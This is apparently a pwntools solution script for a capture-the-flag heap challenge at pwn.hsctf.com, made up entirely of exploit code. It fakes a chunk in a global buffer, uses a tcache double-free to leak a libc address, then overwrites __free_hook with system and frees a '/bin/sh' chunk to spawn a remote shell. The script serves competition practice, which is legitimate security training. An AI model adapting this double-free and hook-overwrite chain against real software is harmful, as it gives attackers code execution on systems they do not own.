from pwn import *

def create(size,data):
    r.sendlineafter('pls > ','1')
    r.sendlineafter('pls > ',str(size))
    r.sendlineafter('tho > ',data)

def delete():
    r.sendlineafter('pls > ','2')

def show():
    r.sendlineafter('pls > ','3')
    return r.recvline()[16:]

###Addr
name = 0x6020e0
main_arena_offset = 0x3ebc40
unsorted_bin_offset = main_arena_offset+0x60
free_hook_offset = 0x3ed8e8
system_offset = 0x4f440

###Exploit
r = remote('pwn.hsctf.com',2222)
r.sendafter('name > ',p64(0)+p64(0x91)+p64(0)*16+p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21)+p64(0))

create(0x88,'a')
delete()
delete()
create(0x88,p64(name+0x10))
create(0x88,'a')
create(0x88,'hello')
delete()
unsorted_bin_addr = u64(show()[16:24])
libc_base = unsorted_bin_addr-unsorted_bin_offset

create(0x18,'a')
delete()
delete()
create(0x18,p64(libc_base+free_hook_offset))
create(0x18,'a')
create(0x18,p64(libc_base+system_offset))
create(0x28,'/bin/sh\x00')
delete()
r.interactive()
